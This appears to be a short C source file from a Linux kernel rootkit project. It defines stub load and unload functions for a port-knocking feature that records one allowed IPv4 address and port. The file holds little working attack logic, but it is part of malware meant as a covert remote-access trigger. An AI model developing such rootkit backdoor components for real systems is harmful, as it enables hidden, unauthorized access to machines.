
/*
 * This file provides all the functionality needed for port knocking.
 */
#include <net/ip.h>
#include <linux/inet.h>

#include "include.h"
#include "main.h"

/* the port for which knocking is enabled */
static unsigned int port;

/* the ip address which is allowed to connect */
static u8 ip[4];

void
load_port_knocking (char *ipv4_addr, unsigned int port_number)
{
	ROOTKIT_DEBUG("Starting to load the port knocking...\n");
	
	/* convert ip string to an int array */
	in4_pton(ipv4_addr, -1, ip, -1, NULL);

	/* copy the port number */
	port = port_number;

	ROOTKIT_DEBUG("Done.\n");
}

void
unload_port_knocking (void)
{
	ROOTKIT_DEBUG("Starting to unload the port knocking...\n");


	ROOTKIT_DEBUG("Done.\n");
}
